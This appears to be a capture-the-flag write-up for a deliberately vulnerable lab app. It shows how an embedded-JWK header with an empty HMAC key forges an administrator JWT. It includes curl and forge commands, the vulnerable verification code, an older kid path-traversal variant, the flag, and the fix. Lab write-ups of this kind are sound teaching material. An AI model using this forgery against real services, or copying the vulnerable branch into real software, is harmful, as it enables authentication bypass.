# 04 Keyring: the token names its own verification key

**Target:** `https://northwind-04-keyring.vercel.app`
**Class:** improper verification of cryptographic signature, CWE-347, via
insecure key selection
**Solution:** `apps/solve/solve-04.sh`

---

## Statement

Sign in as `wiener`, a valid low-privilege account. Reach the administration
page without the administrator's password **and without knowing the server's
signing key**.

---

## How it is solved, step by step

### Step 1. Sign in and confirm the boundary works

```bash
BASE=https://northwind-04-keyring.vercel.app
curl -s -c jar.txt -o /dev/null -X POST \
  -d 'username=wiener&password=peter' "$BASE/login"
curl -s -b jar.txt -o /dev/null -w 'HTTP %{http_code}\n' "$BASE/admin"
# HTTP 403
```

### Step 2. Put a key in the token

```bash
FORGED=$(python3 apps/solve/forge.py --jwk '' \
         --sub administrator --original "$TOKEN" | tail -1)
```

The header now carries:

```json
{ "alg": "HS256", "typ": "JWT", "jwk": { "kty": "oct", "kid": "attacker", "k": "" } }
```

and the signature is HMAC-SHA256 over `header.payload` using the **empty
string** as the key.

### Step 3. Replay it

```bash
curl -s -H "Cookie: session=$FORGED" "$BASE/admin" | grep -oE 'G24\{[^}]+\}'
# G24{Y0u_Ch00s3_Th3_K3y}
```

---

## Why it works

`apps/04-keyring/lib/store.js`:

```js
// VULNERABLE (application 04). When the token carries an embedded JWK the
// server verifies with that key instead of its own, so the attacker supplies
// the key the check is performed with.
if (header.jwk && typeof header.jwk.k === 'string') {
  const embedded = createHmac(HMAC_ALGORITHM, header.jwk.k)
    .update(`${encodedHeader}.${encodedPayload}`)
    .digest();
  const given = Buffer.from(encodedSignature, 'base64url');
  if (embedded.length !== given.length || !timingSafeEqual(embedded, given)) return null;
  const embeddedExpiry = Math.floor(Date.now() / 1000);
  if (typeof payload.exp === 'number' && payload.exp < embeddedExpiry) return null;
  return { ...payload, _verified: false };
}

if (header.alg !== ACCEPTED_ALGORITHM) return null;
```

The verification is arithmetically correct. It is simply performed with a key
the attacker chose.

**An empty key is a perfectly valid HMAC secret.** That is the whole trick, and
it is worth pausing on: the attacker never learns the server's key and never
needs to.

---

## The general rule

> An identifier from untrusted input may select from an **allow-list**. It must
> never select from a namespace the attacker can address.

`kid` is a legitimate feature. A server holding several keys needs a way for a
token to say which one signed it. The defect is not honouring `kid`; it is
honouring a `kid` that arrives inside the token the attacker is trying to
verify.

---

## What this application used to be

The original version exploited **`kid` path traversal**. The server located its
key with:

```js
readFileSync(KEY_ROOT + kid)
```

and `kid` of `../../../../dev/null` read an empty file, producing an empty
signing key. Same conclusion, different route.

That worked on a laptop and **cannot work on a serverless platform**, whose
sandbox refuses traversal reads outside its writable tree. Migrating the
applications to Next.js did not change this, because they run in the same
sandbox. It is a platform property, not a framework one.

`jwk` injection replaced it: pure logic, identical lesson, and it behaves the
same on a laptop, in a container, and on Vercel.

---

## The fix

Delete the branch and verify only with the server's own key. The pinned
`HS256` path below it already does exactly that:

```js
const expected = createHmac(HMAC_ALGORITHM, signingSecret())
  .update(`${encodedHeader}.${encodedPayload}`)
  .digest();
```

---

## Unintended paths, and why they are closed

| Path | Result | Reason |
|---|---|---|
| a random, non-empty key | cannot work | HMAC is keyed, so without the server's key no signature can be forged; only a key the attacker chooses helps them |
| `k` absent or not a string | rejected | the branch requires a string, otherwise it falls through to the pinned path |
| forged `exp` | rejected | the branch enforces `exp` as well as the signature |
| wrong column count or padding | rejected | `timingSafeEqual` requires equal lengths, and it throws otherwise |

That first row is what makes this specific rather than a general signing
bypass, and it is worth stating: the attacker is not breaking the cryptography,
they are choosing the input to it.

---

## Verify it yourself

```bash
BASE=https://northwind-04-keyring.vercel.app bash apps/solve/solve-04.sh
```